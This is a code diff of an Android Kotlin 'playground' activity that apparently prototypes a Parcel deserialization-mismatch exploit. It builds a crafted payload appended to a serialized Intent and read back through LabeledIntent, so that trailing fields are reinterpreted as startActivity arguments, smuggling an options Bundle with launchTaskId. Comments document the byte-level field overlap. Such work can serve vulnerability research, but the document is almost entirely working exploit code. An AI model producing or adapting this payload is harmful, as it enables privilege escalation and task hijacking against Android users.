@@ -4,16 +4,20 @@
 package play.ground
 
 import android.annotation.SuppressLint
+import android.app.ActivityOptions
+import android.app.ProfilerInfo
 import android.content.Intent
+import android.content.pm.LabeledIntent
+import android.os.Build
 import android.os.Bundle
 import android.os.Parcel
 import android.util.Log
+import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import org.jetbrains.anko.button
 import org.jetbrains.anko.intentFor
 import org.jetbrains.anko.sdk27.coroutines.onClick
 import org.jetbrains.anko.verticalLayout
-import kotlin.streams.toList
 
 fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
 fun <T> fixme(value: T) = value
@@ -26,65 +30,139 @@ class IndexActivity : AppCompatActivity() {
     private const val TAG = "Decay"
   }
 
+  @RequiresApi(Build.VERSION_CODES.TIRAMISU)
   override fun onCreate(savedInstanceState: Bundle?) {
     super.onCreate(savedInstanceState)
     verticalLayout {
-      button("compute span length") {
+      button("payload for intent") {
         onClick {
-          val large = 0x11111111
 
-          val payload = Parcel.obtain().apply {
-            writeInt(large) // binder.2
-            writeInt(large + 1) // cookie.1
-            writeInt(large + 2) // cookie.2
-            writeInt(large + 3) // representation
-            writeString(null) // requestWho
-            writeInt(large + 4) // requestCode
-            writeInt(large + 5) // flags
-            writeTypedObject(null, 0) // profiler info
+          val intent = Parcel.obtain().apply {
+            intentFor<MainActivity>().writeToParcel(this, 0)
+          }
 
-            // writeTypedObject(Bundle)
-            writeInt(1) // means not null
-            writeInt(6) // back length
-            writeInt(7) // magic
-            writeInt(2) // size -> 2
-            writeString("android.activity.launchTaskId") // 29
-            writeInt(3) //  type_int
-            writeInt(1) // value
+          val tail = Parcel.obtain().apply {
+            writeString(null) // mSourcePackage => resolvedType
+            writeInt(0) // labelRes  => hdr
+            writeInt(0) // kind1 => flags
+            writeString8("AAA") // text => binder
+            writeInt(11) // alignment => cookie.1
+            run {
+              writeInt(fixme(65)) // span text len => cookie.2
+              writeInt(65)  // p.12 => representation
+              writeString(null) //  p.34 => resultWho(null)
+              writeInt(0) // p.56 => requestCode
+              writeInt(0) // p.78 => flags
+              writeInt(0) // p.90 => profilerInfo(null)
+              run {
+                writeInt(1) // options != null
+                writeInt(fixme(100)) // back patch length
+                writeInt(0x4C444E42) // 'B' 'N' 'D' 'L'
+                writeInt(2) // entry count
+                writeString("android.activity.launchTaskId") // key 1
+                writeValue(1) // value 1
+                writeString("_") // key 2
+                run {  // value 2
+                  writeInt(13) // VAL_BYTEARRAY
+                  writeInt(fixme(70)) // byte array length
+                  writeInt('@'.code)
+                  writeInt(0) // nil
+                }
+              }
 
-            writeString("@") // 不 padding
-            writeInt(13) // VAL_TYPE
-            writeInt(14) // length
-
-            // write the first four bytes, and terminate the string
-            writeInt(0x00000000) // '@@@nil'
+              writeInt(0) // span.start
+              writeInt(1) // span.end
+              writeInt(0) // span.flags
+              writeInt(0) // end flag
+            }
+            writeInt(0) // Icon
           }
 
 
-          val str = Parcel.obtain().apply {
-//            writeInt(136)
-            writeInt(68)
-            appendFrom(payload, 0, payload.dataSize())
+          val labeled = Parcel.obtain().apply {
+            appendFrom(intent, 0, intent.dataSize())
+            appendFrom(tail, 0, tail.dataSize())
           }
 
-          str.setDataPosition(0)
-          val s = str.readString()
-          Log.e(TAG, "s:${s?.length}  size: ${str.dataSize()} pos: ${str.dataPosition()}")
+          val restore = LabeledIntent.CREATOR.createFromParcel(labeled)
+          labeled.enforceNoDataAvail()
 
 
-//          val memRepresentation = payload.marshall()
-//          Log.e(TAG, "mem representation: ${String(memRepresentation)}")
-//          text = "${memRepresentation.size - 1}"
-        }
-      }
+          tail.setDataPosition(0)
+          val resolvedType = tail.readString()
+          val resultTo = tail.readStrongBinder()
+          val resultWho = tail.readString()
+          val requestCode = tail.readInt()
+          val startFlag = tail.readInt()
+          val profiler = tail.readTypedObject(ProfilerInfo.CREATOR)
+          val options = tail.readTypedObject(Bundle.CREATOR)
 
-      button("compute ByteArray length") {
-        onClick {
+          Log.i(
+            TAG,
+            "resolvedType:$resolvedType, resultTo:$resultTo resultWho: $resultWho, requestCode:$requestCode startFlag:$startFlag profiler:$profiler, options:$options"
+          )
+
+          assert(ActivityOptions.fromBundle(options).launchTaskId == 1)
+
 
         }
       }
     }
   }
+
+
+  /* the autonomy of `startActivity` call
+  ```java
+  int _result = this.startActivity(
+    caller,
+    callingPackage,
+    callingFeatureId,
+    intent,
+      {
+        mSourcePackage@String, -> resolvedType
+        mLabelRes@Int, -> hdr
+        kind1@i32=0, -> flags
+        String8@{
+          len@Int=3 -> binder.1
+          'AAA\nil' -> binder.2 ->  'AAA'
+        }
+        kind2@i32=1(ALIGNMENT_SPAN), -> cookie.1
+        String16@{
+         len = ?65 -> cookie.2 // (132-2)/2 = 65
+         'AB' -> representation
+          -1 -> resultWho@String,
+          0 -> requestCode@i32,
+          0 -> flags@i32,
+          0 -> profilerInfo=null,
+          options@Bundle = {
+            launchTaskId = 1,
+             _ = byteArray {
+              len = ?, // **68**
+              '@@@nil'
+             }
+          }
+        }
+
+        span.start -> i32
+        span.end -> i32
+        span.flag -> i32
+      }
+    resolvedType@String=null,
+    resultTo@binder=null{
+      hdr@i32,
+      flags@i32,
+      binder@i64,
+      cookie@i64,
+      representation@i32
+    },
+    resultWho@String=null,
+    requestCode@Int=2,
+    flags@Int=0,
+    profilerInfo@ProfilerInfo=null,
+    options@Bundle=null
+  );
+  ```
+  */
 
 
   /* the autonomy of `startActivity` call
@@ -214,8 +292,6 @@ class IndexActivity : AppCompatActivity() {
       writeInt(0) // cookie
       writeInt(0) // cookie
       writeInt(0) // representation
-
-
     }
   }
 }
